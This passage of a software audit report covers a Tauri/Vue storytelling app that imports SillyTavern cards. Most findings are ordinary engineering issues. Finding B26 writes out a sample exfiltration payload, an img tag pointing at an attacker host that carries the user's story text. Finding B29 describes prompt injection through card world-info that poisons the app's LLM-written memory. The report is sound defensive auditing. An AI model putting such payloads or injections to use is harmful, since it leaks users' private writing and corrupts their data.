**证据**：frontend/src/components/CardShellHost.vue:938-944 deep-watches [props.url, props.html, props.campaignId, props.openingChatSeed] and calls loadShell() (full document rebuild + new blob URL) on any change. frontend/src/AppV2.vue:232-245 openingShellChatSeed is a computed returning a fresh object whenever writing.selectedGreetingIndex, writing.greetingOptions, cardShellOpeningGreetings, or campaign/char display names change. frontend/src/design/writing/WritingScreen.vue:109-120 renders GreetingCards and the opening slot simultaneously.

**问题**：Selecting a greeting (or any async arrival of greetingOptions/char detail after mount) recreates the seed object, which the deep watch treats as a new document: the entire opening shell reloads, discarding whatever multi-step setup the user had in progress inside the card (only variables already flushed via shell_variables_set survive). The seed's meaningful content may be identical — object identity, not value, triggers the reload.

**建议**：Compare the seed by value (serialize once and watch the string), or restrict full reloads to url/campaignId changes and deliver seed updates to a live iframe through the existing session bridge (a 'reseed' message that updates SillyTavern.chat[0]).

### B25. [中 / 前端架构] Design-layer purity contract breached (WritingScreen imports utils/) and the boundary has zero mechanical enforcement

**证据**：frontend/src/design/writing/WritingScreen.vue:20 imports { shouldShowEmptyWritingState } from '../../utils/cardShellPresentation.js', versus design/writing/CONTRACT.md: "本目录组件纯展示、零 store 依赖" and production decision 1 "design 不 import 功能层". Repo-wide grep confirms it is the only functional-layer import under design/. frontend/ has no eslint config at all (no .eslintrc*, no eslint.config.*), so nothing enforces the boundary.

**问题**：The imported function is a pure predicate, so runtime purity survives — but the contract is the project's own red line, and this first breach entered silently precisely because the rule is convention-only. cardShellPresentation.js also contains window-touching and manifest-resolution functions; the next import from the same file can pull real functional coupling into the presentational layer, breaking its standalone-demo/testability property (WritingScreenDemo, fixtures.js).

**建议**：Move the isEmpty computation into useWritingScreenAdapter and pass it (or its inputs) as a prop — the predicate is 7 lines. Add an eslint flat config with no-restricted-imports (or eslint-plugin-boundaries) forbidding design/** from importing stores|composables|adapter|utils|components|tauri-api|plugin-bridge.

### B26. [中 / 安全架构] Card-supplied regex scripts can rewrite message display content into remote-loading HTML rendered in the app origin

**证据**：`crates/tauri-app/src/lib.rs:6383-6398` (`collect_conversation_regex_scripts`) sources display regexes from the imported character/campaign (`collect_scoped_regex_scripts(conversation.character_id, &tool_snapshot.characters)`); `:6449` sets `display_content: render_variant_display_content(variant, display_scripts, depth)`. `frontend/src/components-v2/st/RichContent.vue:29,33` renders that through `v-html="sanitizedHtml"` when `shouldRenderHtmlDisplay(displayContent, sourceContent)` is true (`utils/formatContent.js:25-37`). The `SANITIZE_CONFIG` at `RichContent.vue:11-24` forbids `script`/`iframe`/`object`/`embed`/`link`/`meta`/`base`/`form` and event-handler attributes but places no restriction on `img`/`src` or any remote URL.

**问题**：DOMPurify correctly blocks script execution here — this is not an XSS. The residual issue is exfiltration: a malicious card ships a display regex such as `(.*)` → `<img src="https://attacker/?d=$1">`, which passes `RENDERABLE_HTML_TAG_RE`, survives sanitization, and — with `csp: null` (see the CSP finding) — issues a request carrying the user's story text from the trusted app origin the moment the message renders. No sandbox escape and no IPC access is needed. Precondition is importing a malicious card, but the harm is off-device disclosure of private writing, not local-only damage.

**建议**：Add `ALLOWED_URI_REGEXP: /^(?:data:image\/|blob:|storyforge-cache:|#|\/)/i` (or an equivalent `FORBID_TAGS: ['img','audio','video','source','track']` if inline images are not a product requirement) to `SANITIZE_CONFIG`, and add a unit test asserting a card-supplied `<img src="https://…">` is stripped. The CSP `img-src`/`connect-src` fix covers the same hole defensively; do both, since the sanitizer config is the layer that survives a CSP misconfiguration on a given WebView.

### B27. [中 / 安全架构] Allowlist entries serve arbitrary third-party content, and cached shells are never integrity-pinned or revalidated

**证据**：`crates/tauri-app/src/card_shell_cache.rs:32-47` (`default_allowed_hosts`) permits `testingcf.jsdelivr.net`, `cdn.jsdelivr.net`, `raw.githubusercontent.com`, `github.com`, `gitee.com`, `files.catbox.moe`, `i.ibb.co` — all of which serve content any anonymous party can publish. `cache_path_for_url` (`:133-156`) keys purely on `sha256(url)`; `read_cache` (`:158-173`) returns a hit unconditionally with no TTL, ETag, or content hash comparison, and `write_cache` (`:175-191`) stores only `url`/`content_type`/`byte_len`. `card_shell_allow_host` (`lib.rs:11028-11034`) and its wrapper `frontend/src/tauri-api.js:967` exist but no component calls them, while the rejection message at `card_shell_cache.rs:117` tells the user "可在设置中始终允许该 host".

**问题**：Two distinct consequences. First, `is_url_allowed` returning `Ok` conveys almost no trust: `https://cdn.jsdelivr.net/gh/<any-attacker>/<repo>@<ref>/x.js` is allowlisted by construction, so a card can pull arbitrary attacker-authored code through the *sanctioned* path — the allowlist meaningfully limits only which CDN edge is contacted. Second, mutable refs (`@latest`, branch names) plus a cache that never revalidates means a shell URL reviewed once can be silently swapped upstream on a machine that has not cached it, while a machine that has cached it can never receive an upstream fix — a supply-chain change is invisible in both directions. The dangling `card_shell_allow_host` command also means the error text promises a settings affordance that does not exist, so a legitimately blocked card is a dead end for the user.

**建议**：Record the resolved content hash of each card shell entry URL in the campaign/card record on first fetch and compare on subsequent fetches, surfacing a visible "remote shell changed" state instead of silently running new code; that is the control the allowlist is being asked to provide and cannot. Add a cache metadata `fetched_at` plus an explicit "refresh shell" action so a stale cache is recoverable. Either wire `card_shell_allow_host` into a settings surface or change the message at `card_shell_cache.rs:117` to stop referencing a UI that does not exist. Document in the workstream plan that the allowlist is an egress *routing* control, not a trust decision.

### B28. [中 / 安全架构] One third-party card's CDN quirks are hardcoded into the host fetch security module, including silent content substitution

**证据**：`crates/tauri-app/src/card_shell_cache.rs:20-22` defines `DESTINY_STANDARD_MAP_URL = "https://i.ibb.co/07F075B/Maplite.webp"`, `DESTINY_ULTRA_MAP_URL = "https://i.ibb.co/wFQqdywB/Map.webp"` and a Chinese user-facing fallback string. `cached_optional_map_fallback` (`:219-227`) intercepts a request for the ultra URL and returns the *bytes of a different URL* while reporting `result.url = <requested ultra url>`. `should_fetch_by_ranges` (`:434-436`) special-cases `host_of(url) == "i.ibb.co"`. `max_bytes` is set to 40 MiB with the comment "The card's optional ultra map is about 31.5 MiB" (`:82-86`). `default_allowed_hosts` carries `i.ibb.co` with the comment "The Destiny card's two map sources are served from this image CDN" (`:40-42`).

**问题**：This inverts the project's stated direction that "SillyTavern cards are import and material sources… not the product form" — a specific community card is now load-bearing in the host's network security module. Concretely: the returned `ShellFetchResult` claims a `url` it did not fetch, so any consumer that trusts `result.url` as provenance is wrong; the 40 MiB ceiling was chosen to admit one asset and now applies to every card; and the `i.ibb.co` range-fetch branch is untestable special-case logic in the path that also performs allowlist and redirect validation. Any future card that references `DESTINY_ULTRA_MAP_URL` — trivially, by copying it — receives substituted content plus a hardcoded Chinese notice with no way to opt out.

**建议**：Move the substitution and range-fetch behavior out of `CardShellCache` into card-level metadata: a per-card `optional_asset_fallback: { url, fallback_url, message }` and a per-host `prefers_range_fetch` flag, both data rather than constants, resolved by the caller in `lib.rs`. If the fallback must stay, at minimum set `ShellFetchResult.url` to the URL actually fetched and add a distinct `substituted_for` field so provenance is not misreported. Derive `max_bytes` from config rather than one card's asset size.

### B29. [中 / 安全架构] Postprocess-proposed knowledge/variable/task writes are auto-persisted from card-influenced LLM output with structural validation only, and no trust boundary is documented

**证据**：`crates/tauri-app/src/lib.rs:4640-4661` (`persist_postprocess_outcome_async`) spawns `persist_postprocess_outcome_to_store` (`:4684`) unconditionally after the pipeline, with no user confirmation step. Validation is structural only (campaign scoping, instance-id resolution, `present_chars` filtering — per CLAUDE.md 阶段 5). Card-controlled text reaches the prompt through world info and persona; `grep -rn "prompt injection|untrusted|不可信|恶意卡" docs/ CLAUDE.md` returns nothing outside an archived pre-rewrite doc (`docs/archive/2026-06-16-pre-rewrite/TECHNICAL_DESIGN.md:1384`) — no current document states that imported card text is untrusted input to the pipeline.

**问题**：The read-only Director/Subagent tool set (`crates/app-agent/src/tools.rs:290-950`) is a genuinely strong containment choice: injected card instructions cannot reach a durable write through a tool call. The remaining channel is the postprocess stage, whose proposed knowledge entries, variable updates, and task mutations are applied automatically. So a card that embeds instructions in a world-info entry can persistently poison the campaign's own memory (fabricated knowledge that then re-enters every later prompt, silently-flipped variables, spurious tasks). Structural validation confirms *where* a write lands, never *whether the content was attacker-directed*. The blast radius is one campaign's local data — hence medium, not high — but the absence of any written trust-boundary note means the next contributor has no signal that world-info/persona strings are adversarial input, which is how a read-only tool set quietly acquires a write tool.

**建议**：Add a short "Trust boundaries" section to `docs/ARCHITECTURE-AUDIT.md` (or CLAUDE.md's Hard Rules) stating that card-derived world info, persona, greetings, and shell-written variables are untrusted input to prompt assembly, and that Director/Subagent tools must stay read-only. Tag postprocess-originated knowledge entries with a provenance field (`source: postprocess`, plus the turn id) so poisoned memory is identifiable and revocable after the fact, and surface postprocess writes in the turn's diagnostics panel so a user who sees an anomalous scene can see what it wrote.

### B30. [中 / 产品意图符合度与范围纪律] ST selector variable bag persisted into Campaign variables unvalidated, leaking into the prompt template namespace and colliding with the active-turn write guard

**证据**：frontend/src/utils/cardShellVariableStore.js:2 (CARD_SHELL_VARIABLES_KEY='__storyforge_card_shell_variables', 7 ST bucket types message/character/local/chat/global/script/preset), CardShellHost.vue:247 (written via generic setCampaignVariable). Backend: grep for '__storyforge' across crates/ returns zero matches — no backend awareness, schema, or filtering. crates/app-pipeline/src/lib.rs:2313-2320 inserts every campaign variable into the prompt template context as both bare key and campaign.<key>; :2429-2431 JSON-stringifies object values. crates/tauri-app/src/lib.rs:10094-10095: set_campaign_variable rejects writes during an active turn (P0-7).

**问题**：INTENT decision #6 requires structural validation before persistence into the Campaign truth source; this blob (card UI state: themes, drawings, DLC toggles, whole ST selector buckets) bypasses any schema and lives in the same variable namespace the writing pipeline, Meta Agent, and variable UIs consume. Every prompt assembly serializes the entire blob into the template map (cost grows with shell state size), and a card/preset macro referencing the dunder key would dump raw JSON into an LLM prompt. Separately, the status shell follows the last message, so a user interacting with it while a turn is active gets their shell variable save rejected by reject_if_active_turn — ST card scripts do not expect setVariables to fail, so the card degrades with silent script errors mid-turn. The frontend queue (enqueueCardShellVariableMutation) correctly prevents lost updates between shells but cannot address either issue.

**建议**：Give the backend first-class knowledge of the key: either a dedicated card_shell_variables store/commands (bypassing the campaign variable namespace entirely), or at minimum filter '__'-prefixed keys out of prompt_template_context_from_campaign_runtime and Meta/variable listings, and decide an explicit mid-turn policy (queue-and-flush after turn end, or exempt this key from the turn guard since agents never read it).

### B31. [中 / 产品意图符合度与范围纪律] Declared code freeze overrun the same day and never reconciled; plan-doc status header contradicts the repo state

**证据**：docs/workstreams/CAMPAIGN-WORLDINFO-AND-CARD-SHELL-PLAN.md:3 header still reads "状态：阶段性暂停改代码（文档更新 2026-07-23）" and :115 "后续工作（仅文档清单，本轮不改代码）". The pause was committed in d2b60a0 (2026-07-23 00:20); code commits followed at f22c5fa 01:32, bc0bdbc 03:14, 819c 12:00, 8061 12:19, d36d433 19:38 (git log), and the working tree now holds 13 modified files + 7 new card-shell modules uncommitted (git status).

**问题**：The question this dimension asks is whether the honesty discipline actually gates scope. Here it demonstrably did not: the one hard stop the plan declared was overrun within 72 minutes, and the doc grew four "取代上述判断" sections the same day while the header still claims a pause. The doc remains honest about evidence (it refuses to record GUI PASS), but its status field is dead metadata — a future session following CLAUDE.md's rule to treat plan docs as the progress truth source would read a state that is false in both directions (paused, and 20 commits behind reality).

**建议**：Update the header to the actual state (active WIP, list the uncommitted modules) as part of committing the current card-shell WIP. Going forward, make the status header a commit-time invariant: a "paused" plan doc and a code commit touching that workstream cannot land in the same day without the header changing — a one-line CI or pre-commit grep can enforce this cheaply.

### B32. [中 / 产品意图符合度与范围纪律] Card Studio branch implemented explicitly-deferred Phase 2 scope on day one, in parallel with uncommitted card-shell WIP touching the same hot files

**证据**：docs/workstreams/CARD-STUDIO-FEASIBILITY-2026-07-22.md Phase 1 scope (~line 437-443) lists "不做：完整 MVU 生成 / 前端美化 / 小说长文蒸馏" and §13 advises not to start business code before the design spec; branch feat/card-studio-phase1 commits (git log): cabaace "Phase 1 from-scratch MVP" 21:00, 114ecae "revise existing cards (C path)" 21:42, d2ce5bc "novel adapt prefill path (B MVP)" 21:50 — A+C+B all within 2h15m on 2026-07-22, the same evening ~20 card-shell commits landed on main. git diff main...feat/card-studio-phase1 shows the branch modifies crates/tauri-app/src/lib.rs (37 lines) and frontend/src/tauri-api.js (199 lines), both of which are also modified in main's uncommitted card-shell WIP; merge-base 1bedcaf is 30+ commits behind main.

**问题**：CLAUDE.md hard rule: "Do not implement later phases early." The feasibility doc scoped Phase 1 at 2-3 weeks (A + minimal C) and put novel adaptation in Phase 2 (2-3 weeks); the branch compressed all three entry paths into one evening. For a solo project this creates compound risk: two diverging lines both edit the 19,343-line lib.rs monolith and tauri-api.js, main's WIP is uncommitted (unmergeable, unrebaseable), and the branch's B-line "MVP" almost certainly lacks the distill pipeline the doc says B requires — meaning either it ships a degraded B (violating the project's own no-degradation ethos) or it becomes dead code. The worktree does contain the required design spec (docs/superpowers/specs/2026-07-22-card-studio-phase1-design.md), so the letter of "spec before code" was met, but within the same evening.

**建议**：Sequence, don't parallelize: commit or shelve main's card-shell WIP first (it is the declared current workstream), then rebase feat/card-studio-phase1 and cut its scope back to the documented Phase 1 (drop or clearly flag the B prefill path as experimental). Route new Card Studio commands into the branch's own card_studio_api.rs module (already done — keep it) with a single small registration diff in lib.rs to minimize the standing conflict surface.

### B33. [中 / 产品意图符合度与范围纪律] Designated authority doc asserts stale facts as verified: 14 crates / 110 commands vs actual 16 / 142

**证据**：docs/DOCS-CODE-AUDIT.md:34-36: "Cargo.toml 当前 workspace members 为 14 个 crate", "110 个 #[tauri::command]", "README 中…与当前代码一致". Actual: Cargo.toml lists 16 members (infra-regex, infra-sqlite added); Select-String counts 142 #[tauri::command] in crates/tauri-app/src/lib.rs (now 19,343 lines). The doc is dated 2026-07-06/08 and references frontend/src/App.vue as the checked composition root while AppV2.vue is the current one. README.md:26 was updated to "16 个 crate" but the audit doc claiming to verify it was not.

**问题**：CLAUDE.md instructs every session to "Treat docs/DOCS-CODE-AUDIT.md as the authority for separating current code facts from future plans" and to read it first. An authority doc that is 18 days and three major workstreams stale (SQLite opt-in backend, card shell, campaign worldbook, V2 frontend) — and that phrases stale numbers as affirmatively verified ("与当前代码一致") — actively trains agents and the developer on false facts, undermining the project's otherwise strong partial-evidence discipline. The failure mode is concrete: the mandated step "Confirm the relevant symbols and files still match the plan" gets executed against wrong baselines.

**建议**：Do a dated increment to DOCS-CODE-AUDIT.md (the doc already has that convention): correct counts to 16/142, note AppV2.vue as the composition root, and add one line covering the card-shell/worldbook code facts (CardShellHost, card_shell_cache, campaign_world_info store). Cheaper long-term: replace the hardcoded counts with a script (scripts/count-facts.ps1) whose output is pasted with a date, so the numbers are always one command from re-verification.

### B34. [中 / 产品意图符合度与范围纪律] Android-first decision vs three weeks of desktop-only, WebView2-shaped investment; one gold card nearly saturates the mobile cache budget

**证据**：INTENT.md key decision #1: "Android-first，但桌面端保留为开发和调试环境"; docs/ROADMAP.md:157: Phase 6 "约 20%" as of 2026-07-06 — no Android progress since, while all July commits are SQLite/card-shell/card-studio. WebView2-specific behavior baked into the shell path: CardShellHost.vue:193 ("blob: URL so WebView2 executes scripts (srcdoc often does not)"), :155 (WebView2 min-h collapse workaround), cardShellPresentation.js:57 (pixel-height because "WebView2 has historically dropped compound" values). card_shell_cache.rs:522 (test asserts max_bytes = 40MiB) vs the card's 31MiB ultra map + ~7MiB standard map. Mitigating: card_shell_cache.rs:26-27 cfg(target_os="windows"/"android") shows the local protocol was designed Android-aware.

**问题**：Developing on desktop is sanctioned by INTENT, so this is not a rule violation per se — the risk is that the shell's correctness now rests on empirically-discovered WebView2 quirks (blob-URL loading, height reporting) that have never been exercised on Android System WebView, whose quirk set differs. The 38MiB of map assets for a single card against a 40MiB total cache means the flagship card evicts nearly everything else on mobile, and decode of a 31MiB WebP on a mid-range phone is untested. None of this is visible today because Phase 6 has effectively been paused since 07-06 without the ROADMAP saying so. The debt is not unpayable — the Rust side is platform-cfg'd — but every additional WebView2-conditional in the frontend increases the eventual Android re-validation surface.

**建议**：Before the card-shell workstream is declared done, run its evidence script once on an Android debug build (the arm64-v8a baseline from 07-06 exists) to smoke-test the three riskiest assumptions: blob-iframe script execution, storyforge-cache protocol origin, and large-map fetch/decode. Bump or make configurable the 40MiB cache ceiling, and record in ROADMAP Phase 6 that it is paused pending card-shell completion so the 20% figure stops implying active progress.

### B35. [中 / 工程健康与规模上限] infra-vector rewrites the entire JSON vector corpus to disk on every single upsert

**证据**：crates/infra-vector/src/lib.rs:241-246 — upsert() inserts one record then calls persist_records(&records) with the full HashMap under the write lock; :226-231 persist_records serializes ALL records via atomic_write_json. Embedding dim is 1024 (crates/infra-llm/src/embedder.rs:148), ≈11KB of JSON text per vector. lib.rs:3738 documents the backfill pattern '嵌入成功后覆盖 upsert 写入真实向量' — one full-file rewrite per record backfilled. The whole file is also parsed into RAM at every startup (:187-200, wired at crates/tauri-app/src/lib.rs:673).

**问题**：The brute-force cosine search itself is not the near-term problem (O(N·d) ≈ 10ms at 10k records × 1024 dims); the write path is. Postprocess emits multiple upserts per turn (round summary embedding + knowledge entries + world-info keyword records), so at ~5k records — a few long campaigns — every turn performs several ~50MB serialize+fsync+rename cycles, each blocking all searches behind the RwLock write guard. On the stated Android-first target this means flash write-amplification, battery drain, and multi-second turn latency long before cosine cost matters; embedding backfill of an imported card's worldbook (441 entries per the real-card smoke) would rewrite the file 441 times. The 'M0 brute force, hnsw planned' note (:3) acknowledges the search side but not this persistence design.

**建议**：Decouple persistence from upsert: dirty-flag + debounced flush, or an explicit persist() called once per turn/batch (the callers are already turn-scoped). Move vector payloads out of JSON into a binary sidecar (bincode/mmap) or fold them into the existing infra-sqlite backend before enabling embeddings by default on Android.

### B36. [中 / 工程健康与规模上限] 21,060-line lib.rs holds all 142 commands, AppState, and 154 inline tests — the compile, navigation, and merge bottleneck for every change

**证据**：wc -l crates/tauri-app/src/lib.rs = 21,060 (production code up to `mod tests` at :12485, then ~8.6k lines of inline tests; 154 #[test]/#[tokio::test]); grep -c '#[tauri::command]' = 142; AppState with ~25 store/lock fields at :560-600; crate-type = ["staticlib", "cdylib", "rlib"] in crates/tauri-app/Cargo.toml. The extraction pattern already exists (campaign_store.rs 2456 lines, turn_lifecycle.rs 1745, meta_backend.rs, card_shell_cache.rs are separate modules) but command definitions were never split. A parallel worktree (.worktrees/feat-card-studio-phase1) is concurrently editing the same crate.

**问题**：Every one-line edit to any of 142 commands recompiles the workspace's largest compilation unit and relinks three artifact flavors; every `cargo test -p storyforge --lib` pays the same, since the tests are inline in the same file. rust-analyzer performance on a single 21k-line file degrades the daily edit loop. Most acutely for this project's actual workflow: two agents (main tree + worktree) editing one giant file guarantees merge conflicts in the file that is hardest to review. This is the item that will bite the solo maintainer first — not at some future scale, but on every iteration today.

**建议**：Mechanical split into commands/*.rs modules (campaign, card_shell, meta, connection, plugin, ...) with pub use re-exports so the invoke_handler list and all command signatures stay identical — the project's own 'preserve Tauri command signatures' rule makes this refactor provably safe. Move the inline test module out to per-module #[cfg(test)] files at the same time so test edits stop recompiling command code.

### B37. [中 / 工程健康与规模上限] Meta typed-patch repair layer is unavailable under the SQLite backend — the scaling path silently drops a product pillar

**证据**：crates/tauri-app/src/meta_backend.rs:3-4 (module doc): 'Typed patch persistence remains JSON-only until it has a single SQLite authority'; :67-68 ensure_typed_patch_backend_supported(sqlite_active) returns Err for 'typed patch preview/accept' whenever SQLite is active. SQLite is the documented answer to JSON scaling (docs/workstreams/SQLITE-CURRENT-STATUS-AUDIT-2026-07-21.md), and Meta-as-repair-layer is a stated architectural pillar (CLAUDE.md, docs/INTENT.md).

**问题**：The users most likely to opt into SQLite are exactly those with the longest campaigns — who are also the most likely to accumulate campaign-state corruption that the Meta typed-patch flow exists to repair. Under SQLite they discover at use time (an error from preview/accept) that the repair pillar is gone. The limitation is honestly documented in code but creates a feature-matrix fork where the two storage backends are not behaviorally equivalent, contradicting the cutover story that presents SQLite as a superset path.

**建议**：Before promoting SQLite beyond opt-in, either implement typed-patch persistence on the existing SQLite UoW, or surface the limitation at cutover time (a warning in the SQLite enable flow) instead of at repair time.

### B38. [中 / 工程健康与规模上限] Shared JSON collections grow unboundedly across ALL campaigns with whole-file rewrite per append and no compaction

**证据**：crates/tauri-app/src/campaign_store.rs:71-79 — cards/campaigns/instances/knowledge/tasks/summaries/mvu each held as one Mutex<Vec<T>> spanning every campaign; :9 documents single files like data/round_summaries.json; add_summary (:867+) appends then persists the entire slice via persist() at :1210 (atomic_write_json of all records); list_all_summaries (:840-848) clones the whole vec. RoundSummary and CharacterKnowledgeEntry are appended every turn by postprocess and never compacted.

**问题**：Cost per turn is O(total history across all campaigns ever), not O(current campaign). The 2026-07-06 pressure test in RELEASE-CHECKLIST.md (p95 ≤8.5ms at 500 small writes) measured the empty-store regime, not the regime after a year of use: 20 campaigns × 100+ turns of summaries plus knowledge propagation entries means multi-MB serialize+rename on every turn, on Android flash, while holding the collection lock. Unlike the vector store this data is authoritative (not a rebuildable cache), so the failure mode is user-visible turn latency and battery cost on the primary target platform.

**建议**：Shard the per-turn-growing collections (summaries, knowledge, tasks) per campaign — the store already does per-campaign pathing for world_info books (:462-490), so the pattern and atomic-write helper exist. Alternatively make this the concrete motivation to close the SQLite gaps and flip the default.

### B39. [中 / 工程健康与规模上限] Only browser-level UI test tier always skips: @playwright/test is not installed, while the last five commits are all UI-behavior fixes

**证据**：scripts/run-ui-smoke.ps1:30-37 records a skip when frontend/node_modules/@playwright/test is absent; frontend/package.json devDependencies contains no playwright entry, so the skip is the permanent local state. RELEASE-CHECKLIST.md acknowledges 'UI smoke ... 缺少 @playwright/test 时只会记录 skip' and that Windows Tauri lib tests can die with STATUS_ENTRYPOINT_NOT_FOUND (S1 only partial). Git log 2026-07-23: 'fix(card-shell): restore first-turn opening', 'limit opening and collapse status', 'stabilize real UI validation flow' — five consecutive UI-regression fixes in one day. The injected-iframe bridge itself is built as string-literal arrays in CardShellHost.vue (:555-620, e.g. '"  function seedOpeningChat(){",'), which no linter or unit test parses as JavaScript.

**问题**：The component tier (vitest/happy-dom, 11 files incl. new-campaign-opening.test.mjs) covers Vue-side logic, but the layer that actually regressed repeatedly — script injection into the sandboxed shell iframe, SillyTavern surface patching, jQuery load interception — only executes in a real browser/WebView, and the one tier that could exercise it never runs. The commit history is direct evidence this gap is being paid for in repeated manual-discovery fix cycles.

**建议**：Add @playwright/test to frontend devDependencies so run-ui-smoke.ps1 stops skipping and the release gate gets a real browser tier; add one smoke that loads a minimal shell iframe and asserts the bridge boots (seedOpeningChat ran, SillyTavern.chat seeded). Longer term, move the string-array injected script into a real .js asset compiled/bundled as text so it is at least syntax-checked and unit-testable.

---

## 附录 C：低严重度发现（18 条）

### C1. [低 / 后端分层与依赖] Card-shell allowlist grants are in-memory only despite UI text promising persistent 'always allow'

**证据**：CardShellCache.allowed_hosts is Mutex<HashSet<String>> seeded from defaults with no load/save (card_shell_cache.rs:69, 78, 101-108); the card_shell_allow_host command only mutates memory (lib.rs:11027-11034); the rejection message tells the user '可在设置中始终允许该 host' (card_shell_cache.rs:116-118).

**问题**：A host the user explicitly allowed is forgotten on restart, so cards depending on non-default hosts break again every session — and because the security posture of the allowlist is user-consent-based, silently dropping recorded consent state undermines both UX and the audit story of what the user approved.

**建议**：Persist user-added hosts to a small JSON file under the data dir (merged with default_allowed_hosts() on load), keeping built-in defaults separate from user grants so defaults can still be tightened in updates.

### C2. [低 / 数据模型与状态一致性] World-info entry mutations are addressed by positional index across the IPC boundary

**证据**：campaign_store.rs:578-607 `update_world_info_entry` / `delete_world_info_entry` take `entry_index: usize` into the entries Vec; Tauri commands (lib.rs:10818-10837) pass the frontend-supplied index straight through. Entries have no mandatory stable id (`st_id: Option`). The store's `mutate_world_info` mutex (campaign_store.rs:470-494) prevents torn writes but cannot detect that a caller's index was computed from a stale snapshot; only the enable-toggle path recomputes matches (`resolveCampaignWorldbookEnabledUpdates`, CardShellHost.vue:271-279).

**问题**：With two concurrent editors of the same book — the worldbook UI and the card-shell TavernHelper bridge, both live in the current WIP — an insert or delete by one shifts indices, and the other's pending update/delete then edits or removes the wrong entry. Silent wrong-target mutation of user lore, no error raised.

**建议**：Assign a stable per-entry uuid at import/creation and address update/delete by id (falling back to index only for legacy calls), or add an optimistic check (expected content hash / key set) that rejects the mutation when the entry at the index no longer matches.

### C3. [低 / 数据模型与状态一致性] Card-specific remote-resource fallbacks hardcoded in the host binary

**证据**：crates/tauri-app/src/card_shell_cache.rs:20-21 — `DESTINY_STANDARD_MAP_URL` / `DESTINY_ULTRA_MAP_URL` constants pointing at i.ibb.co assets of one specific imported card, with special-case fallback logic (`cached_optional_map_fallback`, lines 219-236) and a host check `host_of(url) == Some("i.ibb.co")` at line 435.

**问题**：This inverts the project's own data model: SillyTavern cards are supposed to be import material, with the host providing a generic allowlist+cache mediation layer — instead, one card's asset URLs and degradation policy are now application state compiled into the binary. Every future card with large assets will either need its own hardcoded constants or silently miss the fallback behavior, and the constants will dangle when the third-party image host changes.

**建议**：Move per-card resource manifests (URL list, size hints, optional/required, fallback pairs) into imported card metadata or a per-card sidecar config, keeping only the generic allowlist/cache/range-fetch machinery in card_shell_cache.rs.

### C4. [低 / 数据模型与状态一致性] Legacy dual pointers: Conversation.character_id as raw string and half-bindable Campaign↔Conversation links

**证据**：crates/domain/src/conversation.rs:236-242 — `character_id: Option<String>` (raw string, not Id) alongside `campaign_id: Option<Id>`; the bidirectional Campaign.conversation_id ↔ Conversation.campaign_id link is acknowledged as possibly half-bound by the deletion code's own comment "防只绑一边" (lib.rs:6288-6295), which unions both directions to find conversations to delete.

**问题**：The one-Campaign-one-Conversation invariant is maintained by convention plus defensive unioning rather than by a single owned pointer. Deletion handles the half-bound case, but other readers (`find_by_campaign`, accept scope checks) assume whichever side they consult is authoritative; a half-bound pair created by a crash between the two writes yields a conversation that one query path sees and the other does not. The stringly-typed character_id also escapes the "resolve names to instance ids" normalization applied everywhere else.

**建议**：Pick one authoritative direction (Campaign.conversation_id) and derive the reverse at load time, or add a startup consistency pass that repairs half-bound pairs; migrate character_id to Id (serde-compatible) when the flat path is next touched.

### C5. [低 / 多 Agent 流水线与运行时] Event protocol conflates subagent failure with cancellation

**证据**：On subagent Err the pipeline emits SubagentCancelled (app-pipeline/lib.rs:970-978 and 1654-1660); PipelineEvent has no SubagentFailed variant (domain/src/agent.rs:401-481, Cancelled at 433). PostProcessFailed's reason string likewise reads "后处理 Agent 调用失败或被取消" (lib.rs:1331-1333) regardless of cause.

**问题**：The frontend cannot distinguish "user cancelled this character" from "LLM errored for this character", so failure UI (retry affordance, error surfacing) and cancellation UI are forced to be identical, and telemetry on real subagent failure rates is impossible from events alone.

**建议**：Add SubagentFailed { character_id, index, reason } (serde-compatible addition), emit Cancelled only for AgentError::Cancelled; thread the actual error/cancel cause into the PostProcessFailed reason.

### C6. [低 / 多 Agent 流水线与运行时] Non-Campaign mode writing operations are preempted, not serialized: brief dual-pipeline window

**证据**：begin_writing_operation cancels the previous operation's watch channel and immediately installs the new one (tauri-app/src/lib.rs:527-541); it does not wait for the old pipeline to unwind. The Phase-A turn barrier explicitly passes in non-Campaign mode (lib.rs:265-267 "非 Campaign 模式，放行", test turn_barrier_passes_non_campaign_mode at 20444). Cancellation is cooperative at await points only, and tool execution is not raced against cancel (execute_tool_call awaited plainly, runtime.rs:388, 536, 710).

**问题**：Two rapid start_writing calls in legacy mode can have both pipelines live for a short window (until the old one hits its next cancel checkpoint), interleaving appends into the same ConversationStore. Store-level locking prevents corruption, but ordering of the cancelled op's partial writes relative to the new op is unspecified. In Campaign mode the turn barrier closes this; the legacy path — which the project requires to keep working — relies solely on preemption.

**建议**：Cheap hardening: have begin_writing_operation also hand back the previous handle and have callers await a completion signal (e.g. store a oneshot completed_rx in WritingCancelHandle) before starting the new pipeline, or apply a light per-conversation async mutex in the legacy path. Racing execute_tool_call against cancel is optional polish given tools are local.

### C7. [低 / 前端架构] 890 lines of orphaned components-v2/writing/* with a stale rollback rationale, plus two coexisting UI-primitive families

**证据**：frontend/src/components-v2/writing/ contains 8 components (890 lines total: ConversationViewport, ChatMessage, Composer, StreamingMessage, GreetingSelector, ProcessReview, CampaignOverview, ConversationHistoryList) with zero imports anywhere in src/ (only prose mentions in CONTRACT.md files and comments). design/writing/CONTRACT.md rule 6 keeps them "作对照与回退" (comparison & rollback), but App.vue — their only consumer — has been deleted (src/ contains only AppV2.vue; main.js:4,22 mounts AppV2). Separately, components/base/BaseOverlay.vue and components-v2/ui/Overlay.vue (headlessui-based) are two parallel overlay/dialog systems, both in active use (AppV2 uses base/BaseDialog.js alertDialog; NewCampaignForm uses components-v2/ui/Overlay).

**问题**：The deprecation path is at least explicit, which is better than most codebases — but its stated justification is no longer true: rollback to the old viewport is impossible without App.vue, so these files are pure dead weight that grep hits, contract tables reference, and future contributors may mistakenly extend (ProcessReview.vue still carries a P2-1 fix narrative). The dual primitive families are a transitional cost but each new component silently chooses a side.

**建议**：Delete components-v2/writing/ (git history preserves the reference copies) and update CONTRACT.md rule 6 and the history/overview contract headers. Pick one primitive family for new code and note it in the contract cards; migrate base/ call sites opportunistically.

### C8. [低 / 前端架构] shellVarAudit ring buffer is write-only dead instrumentation in the composition root

**证据**：frontend/src/AppV2.vue:204-205 creates shellVarAudit (createVariableWriteAudit(40)) and shellVarAuditTick; lines 273-279 push entries and bump the tick. Repo-wide grep shows no other reference — nothing renders shellVarAudit.list(), and shellVarAuditTick is read by no template or computed. shellVariableOutbox.js:100 documents it as "for debug drawer / status strip".

